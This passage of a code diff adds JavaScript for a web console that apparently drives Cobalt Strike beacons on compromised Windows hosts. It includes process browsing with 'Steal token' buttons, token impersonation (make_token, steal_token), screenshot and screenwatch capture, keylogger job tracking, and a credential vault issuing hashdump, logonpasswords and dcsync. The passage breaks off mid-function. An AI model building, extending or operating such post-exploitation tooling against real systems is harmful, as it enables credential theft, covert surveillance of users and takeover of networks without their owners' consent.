+            while (walk && walk !== '0' && walk !== 0 && depth < 20) {
+                parentPids.add(String(walk));
+                walk = pidMap[walk];
+                depth++;
+            }
+        }
+
+        let html = `<table class="process-table"><thead><tr><th>PID</th><th>PPID</th><th>Name</th><th>Arch</th><th>User</th><th>Session</th><th>Actions</th></tr></thead><tbody>`;
+        procs.forEach(p => {
+            const pid = p.pid || p.PID || '';
+            const ppid = p.ppid || p.PPID || '';
+            const name = this.escapeHtml(p.name || p.Name || p.process || '');
+            const arch = p.arch || p.Arch || '';
+            const user = this.escapeHtml(p.user || p.User || p.owner || '');
+            const session = p.session || p.Session || p.sessid || '';
+            const isBeacon = beaconPid && String(pid) === String(beaconPid);
+            const isParent = parentPids.has(String(pid));
+            const isSystem = !isBeacon && !isParent && (user.toLowerCase().includes('system') || user.toLowerCase().includes('local service'));
+            const rowClass = isBeacon ? 'proc-beacon' : isParent ? 'proc-parent' : isSystem ? 'proc-system' : '';
+            const label = isBeacon ? ' title="◀ Beacon lives here"' : isParent ? ' title="Parent process"' : '';
+            html += `<tr class="${rowClass}"${label}><td>${pid}</td><td>${ppid}</td><td>${name}${isBeacon ? ' <span style="color: var(--terminal-warning); font-size: 0.85em;">◀ BEACON</span>' : ''}</td><td>${arch}</td><td>${user}</td><td>${session}</td><td class="file-actions"><button class="btn btn-sm btn-danger" onclick="BEACON.killProcess(${pid})" title="Kill process">Kill</button> <button class="btn btn-sm btn-info" onclick="BEACON.stealTokenFromProc(${pid})" title="Steal token">Steal</button></td></tr>`;
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+    },
+
+    filterProcesses(query) {
+        const body = document.getElementById('process-browser-body');
+        if (!body || !this.processData.length) return;
+        const q = query.toLowerCase();
+        const filtered = q ? this.processData.filter(p => {
+            const name = (p.name || p.Name || p.process || '').toLowerCase();
+            const user = (p.user || p.User || p.owner || '').toLowerCase();
+            const pid = String(p.pid || p.PID || '');
+            return name.includes(q) || user.includes(q) || pid.includes(q);
+        }) : this.processData;
+        this._drawProcessTable(filtered, body);
+    },
+
+    async killProcess(pid) {
+        if (!this.selectedBid || !confirm(`Kill process ${pid}?`)) return;
+        this._logToConsole('kill ' + pid, 'Processes');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/kill`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pid }),
+            });
+            const data = await resp.json();
+            const taskId = data.result?.taskId || data.data?.taskId;
+            if (taskId) this._trackTaskInConsole(taskId);
+            setTimeout(() => this.loadProcesses(), 3000);
+        } catch (e) { /* ignore */ }
+    },
+
+    stealTokenFromProc(pid) {
+        // Quick steal from process browser — fills token panel and switches
+        const input = document.getElementById('token-steal-pid');
+        if (input) input.value = pid;
+        this.switchTab('tokens');
+        this.stealToken();
+    },
+
+    // ── Screenshot Viewer ────────────────────────────────────────
+    async takeScreenshot() {
+        if (!this.selectedBid) return;
+        this._logToConsole('screenshot');
+        const gallery = document.getElementById('screenshot-gallery');
+        if (gallery) gallery.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Capturing screenshot...</div>';
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/screenshot`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                if (gallery) gallery.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-info">Screenshot task submitted. Polling for result...</div>';
+                const _tid5 = (data.result?.taskId || data.data?.taskId);
+                this._pollScreenshotResult(_tid5, gallery);
+                this._trackTaskInConsole(_tid5);
+            } else if (data.success) {
+                if (gallery) gallery.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-info">Screenshot task queued. Check Console tab for output.</div>';
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    async _pollScreenshotResult(taskId, gallery, attempts = 0) {
+        if (attempts > 20) {
+            if (gallery) gallery.innerHTML = '<div style="padding: 12px;" class="t-warning">Screenshot polling timed out. Check Console tab for results.</div>';
+            return;
+        }
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch('/api/beacon/task/' + taskId);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const results = data.task.result || data.task.results || [];
+                    const errors = data.task.error || [];
+                    // Check for "empty" screenshot error in results OR errors
+                    const allText = this._extractTaskOutput(data.task);
+                    const errorText = errors.map(e => typeof e === 'string' ? e : (e.message || e.output || '')).join(' ');
+                    const combinedText = (allText + ' ' + errorText).trim();
+                    // Echo screenshot result to console
+                    if (combinedText) this._logResultToConsole(combinedText, /empty|error|fail/i.test(combinedText) ? 'error' : 'success');
+                    const isEmptyDesktop = /screenshot.*desktop.*empty/i.test(combinedText);
+                    if (isEmptyDesktop) {
+                        if (gallery) gallery.innerHTML = `<div style="padding: 16px;">
+                            <div class="t-warning" style="font-weight: 600; margin-bottom: 8px;">Screenshot failed: desktop is empty</div>
+                            <div class="t-secondary" style="margin-bottom: 12px;">This beacon is running as <strong>SYSTEM</strong> in Session 0, which has no interactive desktop to capture.</div>
+                            <div class="t-secondary" style="font-weight: 600; margin-bottom: 6px;">How to fix:</div>
+                            <ol style="margin: 0; padding-left: 20px; color: var(--text-secondary); line-height: 1.8;">
+                                <li>Go to the <strong>Processes</strong> tab and find <code style="color: var(--info-text);">explorer.exe</code> running under a logged-in user (Session 1+)</li>
+                                <li>Note the PID, then run in Console: <code style="color: var(--info-text);">screenshot &lt;pid&gt;</code></li>
+                                <li>Or inject into a user-session process first, then screenshot from that beacon</li>
+                            </ol>
+                        </div>`;
+                        return;
+                    }
+                    if (Array.isArray(results) && results.length > 0) {
+                        let hasImage = false;
+                        let html = '<div style="display: flex; flex-wrap: wrap; gap: 12px; padding: 12px;">';
+                        results.forEach((r, i) => {
+                            const imgData = r.data || r.output || r;
+                            if (typeof imgData === 'string' && (imgData.startsWith('data:image') || imgData.startsWith('/9j/') || imgData.startsWith('iVBOR'))) {
+                                hasImage = true;
+                                const src = imgData.startsWith('data:') ? imgData : 'data:image/png;base64,' + imgData;
+                                const ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
+                                this._screenshotCache.push({ src, timestamp: ts });
+                                html += `<div class="screenshot-thumb" onclick="BEACON.viewScreenshot(${this._screenshotCache.length - 1})">
+                                    <img src="${src}" style="max-width: 200px; max-height: 150px; border-radius: 4px; cursor: pointer;">
+                                    <div class="screenshot-thumb-meta">${ts}</div>
+                                </div>`;
+                            } else {
+                                const text = typeof imgData === 'string' ? imgData : (imgData.output || JSON.stringify(imgData));
+                                html += `<div style="padding: 8px;" class="t-muted">${this.escapeHtml(text)}</div>`;
+                            }
+                        });
+                        html += '</div>';
+                        if (gallery) gallery.innerHTML = html;
+                    } else {
+                        // Task completed but no inline image — try the data store
+                        this._tryLoadScreenshotFromStore(gallery);
+                    }
+                    return;
+                }
+            }
+            this._pollScreenshotResult(taskId, gallery, attempts + 1);
+        } catch (e) {
+            this._pollScreenshotResult(taskId, gallery, attempts + 1);
+        }
+    },
+
+    async startScreenwatch() {
+        if (!this.selectedBid) return;
+        this._logToConsole('screenwatch');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/screenwatch`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success) {
+                const gallery = document.getElementById('screenshot-gallery');
+                if (gallery) gallery.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-info">Screenwatch started. Screenshots will appear on Refresh.</div>';
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    async _tryLoadScreenshotFromStore(gallery) {
+        // Wait briefly for the data store to sync, then try loading
+        await new Promise(r => setTimeout(r, 3000));
+        try {
+            const resp = await fetch('/api/beacon/data/screenshots');
+            const data = await resp.json();
+            if (data.success && Array.isArray(data.data) && data.data.length > 0) {
+                this._renderScreenshotGallery(data.data, gallery);
+            } else {
+                if (gallery) gallery.innerHTML = `<div style="padding: 16px; max-width: 700px;">
+                    <div style="color: var(--info-text); margin-bottom: 8px; font-weight: 600;">Screenshot captured successfully</div>
+                    <div style="color: var(--text-secondary); margin-bottom: 12px;">The screenshot was taken but image data is not available through the REST API data store in this CS version. This is a known limitation of the BETA REST API.</div>
+                    <div style="color: var(--text-secondary); font-weight: 600; margin-bottom: 6px;">To view screenshots:</div>
+                    <ul style="margin: 0; padding-left: 20px; color: var(--text-secondary); line-height: 1.8;">
+                        <li>Open the Cobalt Strike GUI client</li>
+                        <li>Go to <strong>View → Screenshots</strong></li>
+                        <li>Or check <code style="color: var(--info-text);">/opt/cobaltstrike/screenshots/</code> on the team server via SSM</li>
+                    </ul>
+                </div>`;
+            }
+        } catch (e) {
+            if (gallery) gallery.innerHTML = '<div class="feature-empty">Could not load screenshots from data store</div>';
+        }
+    },
+
+    _renderScreenshotGallery(screenshots, gallery) {
+        if (!gallery) return;
+        if (!screenshots.length) {
+            gallery.innerHTML = '<div class="feature-empty">No screenshots in data store</div>';
+            return;
+        }
+        let html = '<div style="display: flex; flex-wrap: wrap; gap: 12px; padding: 12px;">';
+        screenshots.forEach((s, i) => {
+            const id = s.id || i;
+            const bid = s.beaconId || s.bid || '?';
+            const ts = s.when ? new Date(s.when).toLocaleString() : 'Unknown';
+            const imgData = s.data || s.image || '';
+            if (imgData) {
+                const src = imgData.startsWith('data:') ? imgData : 'data:image/png;base64,' + imgData;
+                html += `<div style="border: 1px solid var(--border-light); border-radius: 4px; padding: 4px; background: var(--bg-elevated);">
+                    <img src="${src}" style="max-width: 240px; max-height: 180px; border-radius: 4px; cursor: pointer;" onclick="window.open('${src}')">
+                    <div style="color: var(--text-muted); font-size: 0.85em; padding: 4px;">${this.escapeHtml(ts)} (B:${bid})</div>
+                </div>`;
+            } else {
+                html += `<div style="border: 1px solid var(--border-light); border-radius: 4px; padding: 8px; background: var(--bg-elevated); min-width: 200px;">
+                    <div style="color: var(--text-secondary);">Screenshot #${id}</div>
+                    <div style="color: var(--text-muted); font-size: 0.85em;">${this.escapeHtml(ts)} (B:${bid})</div>
+                    <div style="color: var(--text-muted); font-size: 0.85em;">Image data not in API response</div>
+                </div>`;
+            }
+        });
+        html += '</div>';
+        gallery.innerHTML = html;
+    },
+
+    async loadScreenshots() {
+        if (!this.selectedBid) return;
+        const gallery = document.getElementById('screenshot-gallery');
+        if (!gallery) return;
+        gallery.innerHTML = '<div style="padding: 20px; text-align: center;" class="t-muted">Loading screenshots from data store...</div>';
+        try {
+            const resp = await fetch('/api/beacon/data/screenshots');
+            const data = await resp.json();
+            if (data.success && Array.isArray(data.data) && data.data.length > 0) {
+                this._renderScreenshotGallery(data.data, gallery);
+            } else {
+                gallery.innerHTML = `<div style="padding: 16px; max-width: 700px;">
+                    <div style="color: var(--text-muted); margin-bottom: 8px;">No screenshots found in the REST API data store.</div>
+                    <div style="color: var(--text-secondary);">Click <strong>Capture Screenshot</strong> to take one. If screenshots were taken but don't appear here, the CS REST API data store may not sync screenshot images in this version. Check the CS GUI (View → Screenshots) or the team server filesystem.</div>
+                </div>`;
+            }
+        } catch (e) {
+            gallery.innerHTML = '<div class="feature-empty">Error loading screenshots</div>';
+        }
+    },
+
+    _screenshotCache: [],
+
+    viewScreenshot(idx) {
+        const shot = this._screenshotCache[idx];
+        if (!shot) return;
+        const src = shot.data ? `data:image/png;base64,${shot.data}` : (shot.url || '');
+        const overlay = document.createElement('div');
+        overlay.className = 'screenshot-overlay';
+        overlay.onclick = () => overlay.remove();
+        overlay.innerHTML = `<img src="${src}" alt="Screenshot">`;
+        document.body.appendChild(overlay);
+    },
+
+    // ── Token Store ──────────────────────────────────────────────
+    async getUid() {
+        if (!this.selectedBid) return;
+        this._logToConsole('getuid');
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/getuid`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); const _o = document.getElementById('token-output'); if (_o) this.pollTaskOutput(_t, _o); this._trackTaskInConsole(_t); }
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    async makeToken() {
+        if (!this.selectedBid) return;
+        const domain = document.getElementById('token-domain')?.value?.trim();
+        const user = document.getElementById('token-user')?.value?.trim();
+        const pass = document.getElementById('token-pass')?.value;
+        if (!domain || !user || !pass) return alert('Domain, user, and password required');
+        this._logToConsole('make_token ' + domain + '\\\\' + user + ' ****');
+        const output = document.getElementById('token-output');
+        if (output) output.innerHTML += `<div style="color: var(--info-text);">[*] Creating token: ${this.escapeHtml(domain)}\\${this.escapeHtml(user)}</div>`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/token/make`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ domain, user, password: pass }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); const _o = document.getElementById('token-output'); if (_o) this.pollTaskOutput(_t, _o); this._trackTaskInConsole(_t); }
+                // Token change — refresh beacon detail after task completes
+                setTimeout(() => this.refreshBeaconDetail(this.selectedBid, true), 6000);
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    async stealToken() {
+        if (!this.selectedBid) return;
+        const pid = document.getElementById('token-steal-pid')?.value?.trim();
+        if (!pid) return alert('PID required');
+        this._logToConsole('steal_token ' + pid);
+        const output = document.getElementById('token-output');
+        if (output) output.innerHTML += `<div style="color: var(--terminal-info);">[*] Stealing token from PID ${this.escapeHtml(pid)}</div>`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/token/steal`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ pid: parseInt(pid) }),
+            });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); const _o = document.getElementById('token-output'); if (_o) this.pollTaskOutput(_t, _o); this._trackTaskInConsole(_t); }
+                setTimeout(() => this.refreshBeaconDetail(this.selectedBid, true), 6000);
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    async revToSelf() {
+        if (!this.selectedBid) return;
+        this._logToConsole('rev2self');
+        const output = document.getElementById('token-output');
+        if (output) output.innerHTML += `<div style="color: var(--terminal-warning);">[*] Reverting to original token</div>`;
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/token/rev2self`, { method: 'POST' });
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); const _o = document.getElementById('token-output'); if (_o) this.pollTaskOutput(_t, _o); this._trackTaskInConsole(_t); }
+                setTimeout(() => this.refreshBeaconDetail(this.selectedBid, true), 6000);
+            }
+        } catch (e) { /* ignore */ }
+    },
+
+    _extractTaskOutput(task) {
+        // CS task results come as: result: [{output: "...", timestamp: "...", type: "text"}, ...]
+        const result = task.output || task.result || task.results || '';
+        if (Array.isArray(result)) {
+            return result.map(r => {
+                if (typeof r === 'string') return r;
+                return r.output || r.data || r.message || JSON.stringify(r);
+            }).join('\n').trim();
+        }
+        return (typeof result === 'string' ? result : JSON.stringify(result)).trim();
+    },
+
+    async _pollTokenResult(taskId, action, attempts = 0) {
+        if (attempts > 15) return;
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    const text = this._extractTaskOutput(data.task);
+                    this._logResultToConsole(text, 'success');
+                    if (action === 'uid') {
+                        const el = document.getElementById('token-current-uid');
+                        if (el) el.textContent = text || 'Unknown';
+                    }
+                    const output = document.getElementById('token-output');
+                    if (output) {
+                        output.innerHTML += `<div style="color: var(--terminal-success);">[+] ${this.escapeHtml(text)}</div>`;
+                        output.scrollTop = output.scrollHeight;
+                    }
+                    return;
+                }
+            }
+            setTimeout(() => this._pollTokenResult(taskId, action, attempts + 1), 1500);
+        } catch (e) {
+            setTimeout(() => this._pollTokenResult(taskId, action, attempts + 1), 2000);
+        }
+    },
+
+    // ── Jobs & Downloads ─────────────────────────────────────────
+    async loadJobs() {
+        if (!this.selectedBid) return;
+        const jobsBody = document.getElementById('jobs-table-body');
+        const dlBody = document.getElementById('downloads-table-body');
+        if (jobsBody) jobsBody.innerHTML = '<div style="padding: 12px; text-align: center;" class="t-muted">Loading...</div>';
+        // Load jobs via command
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/jobs`);
+            const data = await resp.json();
+            if (data.success && (data.result?.taskId || data.data?.taskId)) {
+                { const _t = (data.result?.taskId || data.data?.taskId); this._pollJobResults(_t, jobsBody); this._trackTaskInConsole(_t); }
+            } else if (data.success && data.result) {
+                this._renderJobs(data.result, jobsBody);
+            }
+        } catch (e) { if (jobsBody) jobsBody.innerHTML = '<div style="padding: 12px;" class="t-danger">Failed to load jobs</div>'; }
+        // Load downloads
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/downloads`);
+            const data = await resp.json();
+            if (data.success && data.downloads) {
+                this._renderDownloads(data.downloads, dlBody);
+            }
+        } catch (e) { if (dlBody) dlBody.innerHTML = '<div style="padding: 12px;" class="t-danger">Failed to load downloads</div>'; }
+    },
+
+    _activityLogKnown: new Set(),
+    _activityLogTimer: null,
+    _activityLogBid: null,
+
+    startActivityLogPoll() {
+        this.stopActivityLogPoll();
+        this._activityLogBid = this.selectedBid;
+        this._activityLogKnown.clear();
+        this.loadActivityLog(true);
+        this._activityLogTimer = setInterval(() => this.loadActivityLog(false), 5000);
+    },
+
+    stopActivityLogPoll() {
+        if (this._activityLogTimer) {
+            clearInterval(this._activityLogTimer);
+            this._activityLogTimer = null;
+        }
+    },
+
+    async loadActivityLog(fullReload = true) {
+        const bid = this._activityLogBid || this.selectedBid;
+        if (!bid) return;
+        const container = document.getElementById('activity-log-body');
+        if (!container) return;
+        if (fullReload) {
+            this._activityLogKnown.clear();
+            container.innerHTML = '<span style="color: var(--terminal-info);">Loading activity log...</span>';
+        }
+        try {
+            const resp = await fetch(`/api/beacon/activity/${this.selectedBid}`);
+            const data = await resp.json();
+            if (!data.success) {
+                container.innerHTML = `<span style="color: var(--terminal-danger);">Failed: ${this.escapeHtml(data.error || 'Unknown error')}</span>`;
+                return;
+            }
+            const tasks = data.data || [];
+            if (!Array.isArray(tasks) || tasks.length === 0) {
+                if (fullReload) container.innerHTML = '<span style="color: var(--text-terminal);">No task history found.</span>';
+                return;
+            }
+            // Sort oldest first so log reads top-to-bottom chronologically
+            tasks.sort((a, b) => (a.created || '').localeCompare(b.created || ''));
+
+            // Only render if there are new tasks
+            const newTasks = tasks.filter(t => t.taskId && !this._activityLogKnown.has(t.taskId));
+            tasks.forEach(t => { if (t.taskId) this._activityLogKnown.add(t.taskId); });
+
+            if (newTasks.length === 0 && !fullReload) return;
+
+            // Get beacon info for external/internal IP and PID
+            const beacon = this.beacons?.find(b => String(b.bid) === String(bid)) || {};
+            const extIp = beacon.external || '';
+            const intIp = beacon.internal || beacon.host || '';
+            const bPid = beacon.pid || '';
+
+            // Build table
+            // Only jobs with jid (CS client only shows JID-bearing tasks)
+            const jobTasks = tasks.filter(t => t.jid != null);
+            jobTasks.sort((a, b) => (a.jid || 0) - (b.jid || 0));
+
+            let html = `<table class="beacon-table" style="width: 100%; font-size: 0.88em;">
+                <thead><tr>
+                    <th>External</th><th>Internal</th><th>PID</th><th>JID</th><th>Status</th><th>Description</th><th>Created</th><th>Updated</th>
+                </tr></thead><tbody>`;
+
+            const fmtDate = (iso) => {
+                if (!iso || iso === '1970-01-01T00:00:00Z') return '';
+                return new Date(iso).toLocaleString('en-US', { month: 'numeric', day: 'numeric', year: '2-digit', hour: 'numeric', minute: '2-digit', hour12: true });
+            };
+
+            const statusClass = (s) => {
+                const su = (s || '').toUpperCase();
+                if (su === 'COMPLETED' || su === 'OUTPUT_RECEIVED') return 'color: var(--success-text)';
+                if (su === 'IN_PROGRESS') return 'color: var(--warning-text)';
+                if (su === 'FAILED') return 'color: var(--danger-text)';
+                return 'color: var(--info-text)';
+            };
+
+            // Map taskCommand to CS client description style
+            const descMap = (cmd) => {
+                if (!cmd) return '';
+                if (/^ps$/.test(cmd)) return 'process';
+                if (/^hashdump$/.test(cmd)) return 'dump password hashes';
+                if (/^screenshot$/.test(cmd)) return 'screenshot';
+                if (/^keylogger$/.test(cmd)) return 'keystroke logger';
+                if (/^screenwatch$/.test(cmd)) return 'screenwatch';
+                if (/^net\s+/.test(cmd)) return cmd;
+                if (/^shell\s+/.test(cmd)) return cmd.replace(/^shell\s+/, '');
+                if (/^mimikatz\s+/.test(cmd) || /chromedump/.test(cmd)) return cmd;
+                return cmd;
+            };
+
+            const statusLabel = (s) => {
+                const su = (s || '').toUpperCase();
+                if (su === 'COMPLETED' || su === 'OUTPUT_RECEIVED') return 'completed';
+                if (su === 'IN_PROGRESS') return 'registered';
+                if (su === 'FAILED') return 'failed';
+                return su.toLowerCase();
+            };
+
+            // Store task data for click-to-expand
+            this._allJobsData = {};
+            jobTasks.forEach(t => {
+                this._allJobsData[t.jid] = t;
+                const hasOutput = (t.result && t.result.length > 0) || (t.error && t.error.length > 0);
+                html += `<tr style="cursor: ${hasOutput ? 'pointer' : 'default'};" ${hasOutput ? `onclick="BEACON.toggleJobOutput(${t.jid})"` : ''} title="${hasOutput ? 'Click to view output' : 'No output'}">
+                    <td>${this.escapeHtml(extIp)}</td>
+                    <td>${this.escapeHtml(intIp)}</td>
+                    <td>${bPid}</td>
+                    <td>${t.jid}</td>
+                    <td style="${statusClass(t.taskStatus)}">${statusLabel(t.taskStatus)}</td>
+                    <td>${this.escapeHtml(descMap(t.taskCommand))}${hasOutput ? ' <span style="opacity:0.4;">▼</span>' : ''}</td>
+                    <td>${fmtDate(t.created)}</td>
+                    <td>${fmtDate(t.updated)}</td>
+                </tr>
+                <tr id="job-output-${t.jid}" style="display: none;"><td colspan="8" style="padding: 0;"><div class="output-display" style="margin: 0; max-height: 300px; border-radius: 0; font-size: 1rem;"></div></td></tr>`;
+            });
+
+            html += '</tbody></table>';
+
+            if (jobTasks.length === 0) {
+                html = '<div class="t-muted" style="padding: 12px; text-align: center;">No jobs found</div>';
+            }
+
+            container.innerHTML = html;
+        } catch (e) {
+            if (fullReload) container.innerHTML = `<div class="t-danger" style="padding: 12px;">Error: ${this.escapeHtml(e.message)}</div>`;
+        }
+    },
+
+    _allJobsData: {},
+
+    toggleJobOutput(jid) {
+        const row = document.getElementById(`job-output-${jid}`);
+        if (!row) return;
+        const visible = row.style.display !== 'none';
+        if (visible) {
+            row.style.display = 'none';
+            return;
+        }
+        row.style.display = '';
+        const container = row.querySelector('.output-display');
+        if (!container) return;
+
+        const t = this._allJobsData[jid];
+        if (!t) { container.innerHTML = '<span style="color: var(--terminal-muted);">No data</span>'; return; }
+
+        let html = '';
+        // Acknowledgements
+        (t.taskAcknowledgements || []).forEach(a => {
+            if (a.text) html += `<span style="color: var(--terminal-info);">[*] ${this.escapeHtml(a.text)}</span>\n`;
+        });
+        // MITRE
+        if (t.tactics && t.tactics.length > 0) {
+            html += `<span style="color: var(--terminal-muted);">    MITRE: ${t.tactics.join(', ')}</span>\n`;
+        }
+        // Results
+        (t.result || []).forEach(r => {
+            const out = r.output || r.message || '';
+            if (out) {
+                html += `<span style="color: var(--terminal-success);">[+] [job ${jid}] output:</span>\n`;
+                html += `<span style="color: var(--text-terminal);">${this.escapeHtml(out.replace(/\r\n/g, '\n').trimEnd())}</span>\n`;
+            }
+        });
+        // Errors
+        (t.error || []).forEach(e => {
+            const msg = typeof e === 'string' ? e : (e.message || e.output || JSON.stringify(e));
+            html += `<span style="color: var(--terminal-danger);">[-] ${this.escapeHtml(msg)}</span>\n`;
+        });
+        if (!html) html = '<span style="color: var(--terminal-muted);">No output yet</span>';
+        container.innerHTML = html;
+    },
+
+    async _pollJobResults(taskId, container, attempts = 0) {
+        if (attempts > 15) return;
+        const delay = attempts < 3 ? 2000 : 4000;
+        await new Promise(r => setTimeout(r, delay));
+        try {
+            const resp = await fetch(`/api/beacon/task/${taskId}`);
+            const data = await resp.json();
+            if (data.success && data.task) {
+                const status = (data.task.taskStatus || data.task.status || '').toUpperCase();
+                if (status === 'OUTPUT_RECEIVED' || status === 'COMPLETED' || status === 'COMPLETE') {
+                    // Try structured job data first; fall back to text extraction
+                    const rawResult = (Array.isArray(data.task.result) && data.task.result.length > 0 ? data.task.result : null) || data.task.output || data.task;
+                    const jobText = this._extractTaskOutput(data.task);
+                    if (jobText) this._logResultToConsole(jobText, 'info');
+                    this._renderJobs(rawResult, container);
+                    return;
+                }
+            }
+            setTimeout(() => this._pollJobResults(taskId, container, attempts + 1), 1500);
+        } catch (e) {
+            setTimeout(() => this._pollJobResults(taskId, container, attempts + 1), 2000);
+        }
+    },
+
+    _renderJobs(result, container) {
+        if (!container) return;
+        let jobs = [];
+        if (Array.isArray(result)) {
+            // Structured result from task API: [{type: "jobs", jobs: [...]}]
+            const jobResult = result.find(r => r.type === 'jobs' && r.jobs);
+            if (jobResult) {
+                jobs = jobResult.jobs;
+            } else if (result.length > 0 && result[0]?.output && result[0]?.type === 'text') {
+                const text = result.map(r => r.output || '').join('\n');
+                container.innerHTML = `<pre style="padding: 12px; color: var(--text-terminal); white-space: pre-wrap;">${this.escapeHtml(text)}</pre>`;
+                return;
+            } else {
+                jobs = result;
+            }
+        }
+        else if (result?.jobs) jobs = result.jobs;
+        else if (typeof result === 'string') {
+            container.innerHTML = `<pre style="padding: 12px; color: var(--text-secondary); white-space: pre-wrap;">${this.escapeHtml(result)}</pre>`;
+            return;
+        }
+        if (jobs.length === 0) {
+            container.innerHTML = '<div style="padding: 12px; text-align: center;" class="t-muted">No active jobs running on this beacon</div>';
+            return;
+        }
+        let html = `<div style="padding: 4px 12px; margin-bottom: 4px;" class="t-muted">${jobs.length} active job${jobs.length !== 1 ? 's' : ''} — these are running persistently on the beacon</div>`;
+        html += '<table class="beacon-table" style="font-size: 0.9em;"><thead><tr><th>JID</th><th>PID</th><th>Description</th><th>Actions</th></tr></thead><tbody>';
+        jobs.forEach(j => {
+            const desc = this.escapeHtml(j.description || j.desc || '');
+            const isKeylogger = /keystroke|keylog/i.test(desc);
+            const isScreenwatch = /screen/i.test(desc);
+            const icon = isKeylogger ? '⌨️ ' : isScreenwatch ? '📷 ' : '';
+            html += `<tr><td>${j.jid || j.JID || ''}</td><td>${j.pid || j.PID || 0}</td><td>${icon}${desc}</td><td><button class="btn btn-sm btn-danger" onclick="BEACON.killJob('${j.jid || j.JID}')">Kill</button></td></tr>`;
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+    },
+
+    _renderDownloads(downloads, container) {
+        if (!container) return;
+        const dl = Array.isArray(downloads) ? downloads : [];
+        if (dl.length === 0) {
+            container.innerHTML = '<div style="padding: 12px; text-align: center;" class="t-muted">No active downloads</div>';
+            return;
+        }
+        let html = '<table class="process-table"><thead><tr><th>File</th><th>Size</th><th>Progress</th><th>Actions</th></tr></thead><tbody>';
+        dl.forEach(d => {
+            const name = this.escapeHtml(d.name || d.path || d.file || '');
+            const size = this.formatFileSize(d.size || 0);
+            const pct = d.progress || d.rcvd ? Math.round(((d.rcvd || 0) / (d.size || 1)) * 100) : 0;
+            html += `<tr><td>${name}</td><td class="file-size">${size}</td><td>${pct}%</td><td class="file-actions"><button onclick="BEACON.cancelDownload('${this.escapeAttr(d.path || d.name || '')}')">Cancel</button></td></tr>`;
+        });
+        html += '</tbody></table>';
+        container.innerHTML = html;
+    },
+
+    async killJob(jid) {
+        if (!this.selectedBid) return;
+        this._logToConsole('jobkill ' + jid);
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/jobs/${jid}/stop`, { method: 'POST' });
+            const data = await resp.json();
+            const taskId = data.result?.taskId || data.data?.taskId;
+            if (taskId) this._trackTaskInConsole(taskId);
+            setTimeout(() => this.loadJobs(), 3000);
+        } catch (e) { /* ignore */ }
+    },
+
+    async cancelDownload(path) {
+        if (!this.selectedBid) return;
+        this._logToConsole('cancel ' + path);
+        try {
+            const resp = await fetch(`/api/beacon/${this.selectedBid}/downloads/cancel`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ path }),
+            });
+            const data = await resp.json();
+            const taskId = data.result?.taskId || data.data?.taskId;
+            if (taskId) this._trackTaskInConsole(taskId);
+            setTimeout(() => this.loadJobs(), 3000);
+        } catch (e) { /* ignore */ }
+    },
+
+    // ── Credential Vault ─────────────────────────────────────────
+    async runHashdump() {
+        await this._runCredCommand('hashdump');
+    },
+
+    async runLogonPasswords() {
+        await this._runCredCommand('logonpasswords');
+    },
+
+    async runDcsync() {
+        const domain = document.getElementById('dcsync-domain')?.value?.trim();
+        const user = document.getElementById('dcsync-user')?.value?.trim();
+        if (!domain || !user) return alert('Domain and user required');
+        await this._runCredCommand('dcsync', { domain, user });
+    },
+
+    async _runCredCommand(type, extra = {}) {
+        if (!this.selectedBid) return;
+        this._logToConsole(type === 'dcsync' ? 'dcsync ' + (extra.domain || '') + ' ' + (extra.user || '') : type, 'Creds');
+        const output = document.getElementById('creds-output');
+        if (output) { output.innerHTML += `\n<span style="color: var(--terminal-prompt);">beacon&gt;</span> <span style="color: var(--text-terminal);">${this.escapeHtml(type)}</span>\n`; }
